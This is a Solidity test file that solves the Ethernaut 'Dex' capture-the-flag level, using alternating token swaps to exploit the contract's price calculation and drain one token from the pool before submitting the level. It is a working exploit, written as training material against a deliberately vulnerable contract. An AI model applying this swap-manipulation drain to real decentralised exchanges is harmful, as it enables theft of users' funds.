//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../core/Ethernaut.sol';
import '../levels/22-Dex/DexFactory.sol';

contract DexTest is DSTest {
  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    // Setup instance of the Ethernaut contract
    ethernaut = new Ethernaut();
    vm.deal(attacker, 100 ether); // fund our attacker contract with 1 ether
  }

  function min(uint256 a, uint256 b) internal pure returns (uint256) {
    return a <= b ? a : b;
  }

  function testDexHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------

    DexFactory dexFactory = new DexFactory();
    ethernaut.registerLevel(dexFactory);
    vm.startPrank(attacker);
    address levelAddress = ethernaut.createLevelInstance(dexFactory);
    Dex ethernautDex = Dex(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    address tkn_one_address = ethernautDex.token1();
    address tkn_two_address = ethernautDex.token2();

    ERC20(tkn_one_address).approve(address(ethernautDex), type(uint256).max);
    ERC20(tkn_two_address).approve(address(ethernautDex), type(uint256).max);

    bool tick = true;

    while (ethernautDex.balanceOf(tkn_one_address, address(ethernautDex)) > 0) {
      emit log_named_uint(
        'Remaining Token 1',
        ethernautDex.balanceOf(tkn_one_address, address(ethernautDex))
      );
      emit log_named_uint(
        'Remaining Token 2',
        ethernautDex.balanceOf(tkn_two_address, address(ethernautDex))
      );
      emit log_named_uint(
        'Token 1',
        ethernautDex.balanceOf(tkn_one_address, attacker)
      );
      emit log_named_uint(
        'Token 2',
        ethernautDex.balanceOf(tkn_two_address, attacker)
      );
      emit log('');

      if (tick) {
        uint256 amount = min(
          ethernautDex.balanceOf(tkn_one_address, attacker),
          ethernautDex.balanceOf(tkn_one_address, address(ethernautDex))
        );
        ethernautDex.swap(tkn_one_address, tkn_two_address, amount);
        tick = false;
      } else {
        uint256 amount = min(
          ethernautDex.balanceOf(tkn_two_address, attacker),
          ethernautDex.balanceOf(tkn_two_address, address(ethernautDex))
        );
        ethernautDex.swap(tkn_two_address, tkn_one_address, amount);
        tick = true;
      }
    }
    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------

    bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(levelSuccessfullyPassed);
  }
}
